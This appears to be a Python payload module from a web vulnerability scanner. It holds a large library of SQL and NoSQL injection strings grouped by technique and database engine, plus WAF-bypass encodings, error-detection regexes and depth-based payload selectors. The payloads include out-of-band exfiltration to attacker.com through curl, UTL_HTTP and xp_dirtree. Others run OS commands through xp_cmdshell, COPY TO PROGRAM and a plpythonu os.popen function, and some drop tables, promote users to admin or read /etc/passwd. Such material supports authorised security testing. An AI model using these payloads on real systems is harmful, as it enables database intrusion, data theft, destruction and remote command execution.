"""
SQL Injection Payloads — Comprehensive library organized by technique.
100+ payloads covering error-based, UNION, blind boolean, blind time-based,
WAF bypass, and DB-specific vectors.
"""

# ── Error-Based Payloads (trigger DB error messages) ─────────────────────────
ERROR_BASED = [
    # Generic
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 OR 1=1",
    "1 OR 1=1 --",
    "' OR ''='",
    "admin'--",
    "admin' #",
    "admin'/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "1' OR '1'='1' ) --",
    "1)) OR ((1=1",
    "' OR 1=1 LIMIT 1 --",
    "' OR 'x'='x",
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 100 --",
    "' HAVING 1=1 --",
    "' GROUP BY 1 --",
]

# ── MySQL-Specific ───────────────────────────────────────────────────────────
MYSQL_ERROR = [
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
    "' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    "' AND EXP(~(SELECT * FROM (SELECT VERSION()) a)) --",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(VERSION())) USING utf8))) --",
    "' UNION SELECT NULL, @@version --",
    "' AND GTID_SUBSET(CONCAT(0x7e, VERSION()), 1) --",
]

# ── PostgreSQL-Specific ──────────────────────────────────────────────────────
POSTGRESQL_ERROR = [
    "' AND 1=CAST(VERSION() AS INT) --",
    "' AND 1=CAST(CURRENT_USER AS INT) --",
    "'; SELECT version() --",
    "' UNION SELECT NULL, version() --",
    "' AND EXTRACTVALUE(xmlparse(document '<?xml version=\"1.0\"?>'), '/x') --",
    "' AND 1=TO_NUMBER(VERSION()) --",
]

# ── MSSQL-Specific ───────────────────────────────────────────────────────────
MSSQL_ERROR = [
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=CONVERT(int, DB_NAME()) --",
    "' AND 1=CONVERT(int, USER_NAME()) --",
    "'; EXEC xp_cmdshell('whoami') --",
    "' UNION SELECT NULL, @@version --",
    "' AND @@SERVERNAME=1 --",
]

# ── Oracle-Specific ──────────────────────────────────────────────────────────
ORACLE_ERROR = [
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) --",
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",
    "' UNION SELECT NULL, banner FROM v$version --",
    "' AND EXTRACTVALUE(XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % test SYSTEM \"x\">%test;]><root/>'), '/x') = 1 --",
]

# ── SQLite-Specific ──────────────────────────────────────────────────────────
SQLITE_ERROR = [
    "' AND sqlite_version()=sqlite_version() --",
    "' UNION SELECT NULL, sqlite_version() --",
    "' AND TYPEOF(1) --",
    "' AND UNICODE(1) --",
]

# ── UNION-Based (column enumeration) ─────────────────────────────────────────
UNION_BASED = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION ALL SELECT NULL --",
    "' UNION ALL SELECT NULL,NULL,NULL --",
    "0 UNION SELECT NULL --",
    "0 UNION SELECT NULL,NULL --",
    "0 UNION SELECT NULL,NULL,NULL --",
]

# ── Blind Boolean-Based ──────────────────────────────────────────────────────
BOOLEAN_BLIND = [
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' AND SUBSTRING(@@version,1,1)='5' --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>1000 --",
    "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64 --",
    "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>96 --",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR SUBSTRING(username,1,1)='a' FROM users --",
]

# ── Time-Based Blind (per DB engine) ─────────────────────────────────────────
TIME_BLIND_MYSQL = [
    "' AND SLEEP(3) --",
    "' OR SLEEP(3) --",
    "' AND IF(1=1, SLEEP(3), 0) --",
    "' AND IF(1=2, SLEEP(3), 0) --",
    "1' AND SLEEP(3) --",
    "' AND (SELECT SLEEP(3)) --",
    "' AND BENCHMARK(5000000, SHA1('test')) --",
]

TIME_BLIND_MSSQL = [
    "'; WAITFOR DELAY '0:0:3' --",
    "' AND 1=1; WAITFOR DELAY '0:0:3' --",
    "'; IF(1=1) WAITFOR DELAY '0:0:3' --",
    "'; IF(1=2) WAITFOR DELAY '0:0:3' --",
    "1; WAITFOR DELAY '0:0:3' --",
]

TIME_BLIND_PGSQL = [
    "' AND pg_sleep(3) --",
    "' OR pg_sleep(3) --",
    "'; SELECT pg_sleep(3) --",
    "' AND 1=(SELECT 1 FROM pg_sleep(3)) --",
    "1; SELECT pg_sleep(3) --",
]

TIME_BLIND_ORACLE = [
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3) --",
    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3) --",
    "' AND UTL_INADDR.GET_HOST_ADDRESS('sleep3.example.com')='1' --",
]

# ── WAF Bypass Payloads ──────────────────────────────────────────────────────
WAF_BYPASS = [
    # Case toggling
    "' oR '1'='1",
    "' Or '1'='1",
    "' uNiOn SeLeCt NULL --",
    "' UnIoN sElEcT NULL,NULL --",
    # Comment insertion
    "' UN/**/ION SEL/**/ECT NULL --",
    "' UNI%0bON SEL%0bECT NULL --",
    "' /*!UNION*/ /*!SELECT*/ NULL --",
    "' /*!50000UNION*/ /*!50000SELECT*/ NULL --",
    # Encoding tricks
    "' %55NION %53ELECT NULL --",
    "' UNION%0aSELECT%0aNULL --",
    "' UNION%09SELECT%09NULL --",
    "' UNION%0DSELECT%0DNULL --",
    # Double URL encoding (raw — encoding handled by tester)
    "' %252F%252A*/UNION%252F%252A*/SELECT NULL --",
    # No-space tricks
    "'/**/OR/**/1=1/**/--",
    "'%0bOR%0b1=1%0b--",
    # Hex encoding
    "' AND 0x313D31 --",
    # Alternate operators
    "' && 1=1 --",
    "' || 1=1 --",
    "' LIKE 1 --",
    "' REGEXP 1 --",
]

# ── Error Detection Patterns (compiled regex) ────────────────────────────────
import re

SQLI_ERROR_PATTERNS = [
    re.compile(r'SQL syntax.*?MySQL', re.IGNORECASE),
    re.compile(r'Warning.*?\bmysql_', re.IGNORECASE),
    re.compile(r'MySqlException', re.IGNORECASE),
    re.compile(r'valid MySQL result', re.IGNORECASE),
    re.compile(r'check the manual that corresponds to your (MySQL|MariaDB)', re.IGNORECASE),
    re.compile(r'PostgreSQL.*?ERROR', re.IGNORECASE),
    re.compile(r'pg_query\(\).*?ERROR', re.IGNORECASE),
    re.compile(r'pg_exec\(\).*?ERROR', re.IGNORECASE),
    re.compile(r'PSQLException', re.IGNORECASE),
    re.compile(r'ORA-\d{5}', re.IGNORECASE),
    re.compile(r'Oracle.*?Driver', re.IGNORECASE),
    re.compile(r'Microsoft.*?ODBC.*?SQL Server', re.IGNORECASE),
    re.compile(r'Microsoft.*?SQL.*?Server.*?Error', re.IGNORECASE),
    re.compile(r'SqlException', re.IGNORECASE),
    re.compile(r'System\.Data\.SqlClient', re.IGNORECASE),
    re.compile(r'Unclosed quotation mark', re.IGNORECASE),
    re.compile(r'quoted string not properly terminated', re.IGNORECASE),
    re.compile(r'SQLite.*?error', re.IGNORECASE),
    re.compile(r'SQLSTATE\[', re.IGNORECASE),
    re.compile(r'Syntax error.*?in query', re.IGNORECASE),
    re.compile(r'mysql_fetch', re.IGNORECASE),
    re.compile(r'num_rows', re.IGNORECASE),
    re.compile(r'SQL Server.*?Error', re.IGNORECASE),
    re.compile(r'JDBC.*?Exception', re.IGNORECASE),
    re.compile(r'Hibernate.*?Exception', re.IGNORECASE),
    re.compile(r'Unexpected end of command', re.IGNORECASE),
    re.compile(r'unterminated.*?string', re.IGNORECASE),
    re.compile(r'PDOException', re.IGNORECASE),
    re.compile(r'sqlite3\.OperationalError', re.IGNORECASE),
    re.compile(r'django\.db\.utils', re.IGNORECASE),
]

# ── WAF Detection Signatures ─────────────────────────────────────────────────
WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
    'AWS WAF': ['awselb', 'x-amzn-requestid', 'aws'],
    'ModSecurity': ['mod_security', 'modsecurity', 'NOYB'],
    'Sucuri': ['x-sucuri-id', 'sucuri'],
    'Akamai': ['akamai', 'x-akamai'],
    'Incapsula': ['incap_ses', 'visid_incap', 'incapsula'],
    'F5 BIG-IP': ['bigipserver', 'f5-', 'ts='],
    'Barracuda': ['barra_counter_session', 'barracuda'],
}


# ── Stacked Queries — Multi-statement injection ──────────────────────────────
STACKED_QUERIES = [
    # MySQL
    "'; SELECT SLEEP(3);--",
    "'; INSERT INTO temp VALUES('pwned');--",
    "'; UPDATE users SET role='admin' WHERE username='test';--",
    "'; DROP TABLE IF EXISTS temp;--",
    # MSSQL  (most permissive for stacked queries)
    "'; EXEC xp_cmdshell('whoami');--",
    "'; EXEC sp_makewebtask '/tmp/test.html','SELECT * FROM users';--",
    "'; WAITFOR DELAY '0:0:5';--",
    "'; DECLARE @x VARCHAR(100);SET @x='test';--",
    # PostgreSQL
    "'; SELECT pg_sleep(3);--",
    "'; CREATE TABLE temp(data TEXT);--",
    "'; COPY (SELECT '') TO PROGRAM 'id';--",
    # SQLite
    "'; ATTACH DATABASE '/tmp/test.db' AS temp;--",
]

# ── Second-Order SQLi — Payloads stored and triggered later ───────────────────
SECOND_ORDER = [
    "admin'--",
    "admin' OR '1'='1",
    "test'); DROP TABLE users;--",
    "${(7*7)}",
    "{{7*7}}",
    'admin"--',
    "admin'; WAITFOR DELAY '0:0:5';--",
    "' UNION SELECT null,null,null--",
]

# ── NoSQL Injection ───────────────────────────────────────────────────────────
NOSQL_INJECTION = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "sleep(3000)"}',
    '{"$or": [{}, {"a": "a"}]}',
    "{'$gt': ''}",
    "admin'||'1'=='1",
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    "true, $where: '1 == 1'",
    ";return true;",
]

# ── Out-of-Band (OOB) SQLi ──────────────────────────────────────────────────
OOB_SQLI = [
    # MySQL OOB via DNS
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\x'))--",
    "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e6174746b722e636f6d5c5c78))--",
    # MSSQL OOB via DNS
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\x'--",
    "'; DECLARE @x VARCHAR(100);SELECT @x=DB_NAME();EXEC('master..xp_dirtree \"\\\\'+@x+'.attacker.com\\x\"')--",
    "'; EXEC master..xp_subdirs '\\\\attacker.com\\x'--",
    # Oracle OOB
    "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM v$instance--",
    "' UNION SELECT HTTPURITYPE('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)).GETCLOB() FROM DUAL--",
    "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com') FROM DUAL--",
    # PostgreSQL OOB
    "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'--",
    "' UNION SELECT dblink_connect('host=attacker.com dbname=x')--",
]

# ── JSON / REST API SQLi ────────────────────────────────────────────────────
JSON_SQLI = [
    '{"id": "1 OR 1=1--"}',
    '{"id": "1 UNION SELECT NULL,NULL,NULL--"}',
    '{"username": "admin\' OR \'1\'=\'1", "password": "x"}',
    '{"search": "\' UNION SELECT version()--"}',
    '{"filter": {"$where": "sleep(3000)"}}',
    '{"id": "1; DROP TABLE users--"}',
    '{"query": "1\' AND SLEEP(3)--"}',
    '{"sort": "id; WAITFOR DELAY \'0:0:3\'--"}',
    '{"limit": "1 UNION ALL SELECT NULL,username,password FROM users--"}',
    '{"id": 1, "OR 1=1--": ""}',
    '{"id": "1\'/**/UNION/**/SELECT/**/NULL--"}',
    '{"field": "\') OR (\'1\'=\'1"}',
]

# ── HTTP Header SQLi ────────────────────────────────────────────────────────
HEADER_SQLI = [
    # X-Forwarded-For
    "127.0.0.1' OR '1'='1",
    "127.0.0.1'; WAITFOR DELAY '0:0:5'--",
    "127.0.0.1' UNION SELECT NULL,NULL,NULL--",
    # Referer
    "https://example.com/' OR '1'='1",
    "https://example.com/' UNION SELECT version()--",
    # User-Agent
    "Mozilla/5.0' OR '1'='1",
    "Mozilla/5.0'; WAITFOR DELAY '0:0:5'--",
    # Cookie
    "session=x' OR '1'='1; --",
    "lang=en' UNION SELECT NULL--",
    # Accept-Language
    "en-US' OR '1'='1",
    "en' UNION SELECT version()--",
    # Host header
    "localhost' OR '1'='1'--",
]

# ── Advanced Comment-Based Bypass ────────────────────────────────────────────
COMMENT_BYPASS = [
    "' UN/**/ION SEL/**/ECT 1,2,3--",
    "' UNI%0bON SELE%0bCT 1,2,3--",
    "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
    "' UNION%23%0ASELECT 1,2,3--",
    "' UNION%23%0D%0ASELECT 1,2,3--",
    "' UNION--%0ASELECT 1,2,3",
    "' UNION/**/ALL/**/SELECT/**/1,2,3--",
    "'-1'/*!UNION*//*!SELECT*/1,database(),3#",
    "'/*! OR*/ 1=1--",
    "' /*!32302 AND*/ 1=1--",
    "' /*!50000 AND*/ 1=1--",
]

# ── Advanced Blind Techniques ────────────────────────────────────────────────
ADVANCED_BLIND = [
    # Conditional error-based
    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
    "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--",
    # Heavy query time-based (when SLEEP is blocked)
    "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0--",
    # Substring extraction
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "' AND ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64--",
    "' AND (SELECT LENGTH(database()))>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
    # Bitwise extraction
    "' AND (SELECT (CASE WHEN ((SELECT ASCII(SUBSTRING(database(),1,1)))&1) THEN 1 ELSE 0 END))--",
    "' AND (SELECT (CASE WHEN ((SELECT ASCII(SUBSTRING(database(),1,1)))&2) THEN 1 ELSE 0 END))--",
    "' AND (SELECT (CASE WHEN ((SELECT ASCII(SUBSTRING(database(),1,1)))&4) THEN 1 ELSE 0 END))--",
    # PostgreSQL conditional
    "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
    "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
    # MSSQL conditional
    "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
    "'; IF (1=2) WAITFOR DELAY '0:0:3'--",
    "'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:3'--",
]

# ── DB-Specific Advanced Payloads ────────────────────────────────────────────
MYSQL_ADVANCED = [
    "' AND MAKE_SET(1,version())--",
    "' AND NAME_CONST(version(),1)--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(database() AS CHAR),0x7e)) LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' PROCEDURE ANALYSE(EXTRACTVALUE(RAND(),CONCAT(0x3a,VERSION())),1)--",
    "' AND JSON_EXTRACT('{\"a\":1}','$')--",
    "' AND (SELECT (ELT(1=1,1)))--",
    "' AND UPDATEXML(null,CONCAT(0x0a,version()),null)--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
]

POSTGRESQL_ADVANCED = [
    "' AND 1=CAST(current_database() AS INT)--",
    "' UNION SELECT 1,string_agg(table_name,',') FROM information_schema.tables--",
    "'; DO $$ BEGIN RAISE NOTICE '%', version(); END $$;--",
    "' AND 1=(SELECT COUNT(*) FROM pg_ls_dir('/'))--",
    "'; CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu;--",
    "' UNION SELECT NULL,array_to_string(ARRAY(SELECT datname FROM pg_database),',')--",
    "' AND (current_setting('is_superuser'))::int=1--",
    "' UNION SELECT NULL,version()--",
]

MSSQL_ADVANCED = [
    "' AND 1=CONVERT(int,DB_NAME())--",
    "' AND 1=CONVERT(int,USER_NAME())--",
    "' AND 1=CONVERT(int,@@SERVERNAME)--",
    "'; EXEC sp_MSforeachtable @command1='PRINT ''?'''--",
    "'; DECLARE @x SYSNAME;SELECT TOP 1 @x=name FROM sysobjects WHERE xtype='U';SELECT @x--",
    "' UNION SELECT 1,name FROM master.dbo.sysdatabases--",
    "' AND 1=convert(int,(SELECT TOP 1 name FROM master..sysdatabases))--",
    "'; EXEC xp_fileexist 'c:\\boot.ini'--",
    "' UNION SELECT 1,STUFF((SELECT ',' + name FROM sys.tables FOR XML PATH('')),1,1,'')--",
]

ORACLE_ADVANCED = [
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL))--",
    "' UNION SELECT NULL,table_name FROM all_tables WHERE ROWNUM<=10--",
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--",
    "' UNION SELECT NULL,listagg(table_name,',') WITHIN GROUP(ORDER BY table_name) FROM user_tables--",
    "' AND DBMS_XDB.GETRESOURCE('/etc/passwd') IS NOT NULL--",
    "' AND XMLType((SELECT version FROM v$instance))--",
]

# ── Arithmetic Variations ────────────────────────────────────────────────────
ARITHMETIC_SQLI = [
    "1-false",
    "1-true",
    "1*56",
    "1*0",
    "1/1",
    "1/0",
    "1+0",
    "1+1",
]

# ── Encoded / Obfuscated SQLi ────────────────────────────────────────────────
ENCODED_SQLI = [
    # Hex encoded
    "0x27206f722031",      # ' or 1
    "0x756e696f6e",       # union
    # Char() function
    "CHAR(39)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)",  # 'OR 1=1
    "CHR(39)||CHR(79)||CHR(82)||CHR(32)||CHR(49)||CHR(61)||CHR(49)",    # Oracle variant
    # Double URL encoded
    "%2527%2520OR%25201%253D1--",
    "%252F%252A*/UNION%252F%252A*/SELECT",
    # Unicode encoded
    "\\u0027\\u0020OR\\u00201=1--",
]


def get_all_sqli_payloads() -> list:
    """Return combined list of all SQLi payloads for deep scans."""
    return (
        ERROR_BASED + MYSQL_ERROR + POSTGRESQL_ERROR + MSSQL_ERROR +
        ORACLE_ERROR + SQLITE_ERROR + UNION_BASED + BOOLEAN_BLIND +
        TIME_BLIND_MYSQL + TIME_BLIND_MSSQL + TIME_BLIND_PGSQL +
        TIME_BLIND_ORACLE + WAF_BYPASS + STACKED_QUERIES +
        SECOND_ORDER + NOSQL_INJECTION + OOB_SQLI + JSON_SQLI +
        HEADER_SQLI + COMMENT_BYPASS + ADVANCED_BLIND +
        MYSQL_ADVANCED + POSTGRESQL_ADVANCED + MSSQL_ADVANCED +
        ORACLE_ADVANCED + ARITHMETIC_SQLI + ENCODED_SQLI
    )


def get_sqli_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate SQLi payloads."""
    if depth == 'shallow':
        return ERROR_BASED[:8] + TIME_BLIND_MYSQL[:2]
    elif depth == 'medium':
        return (ERROR_BASED + UNION_BASED[:5] + BOOLEAN_BLIND[:5] +
                TIME_BLIND_MYSQL + JSON_SQLI[:4] + HEADER_SQLI[:4])
    else:  # deep
        return get_all_sqli_payloads()


def get_time_based_payloads() -> dict:
    """Return time-based payloads grouped by database engine."""
    return {
        'mysql': TIME_BLIND_MYSQL,
        'mssql': TIME_BLIND_MSSQL,
        'postgresql': TIME_BLIND_PGSQL,
        'oracle': TIME_BLIND_ORACLE,
    }


def get_nosql_payloads() -> list:
    """Return NoSQL injection payloads."""
    return NOSQL_INJECTION
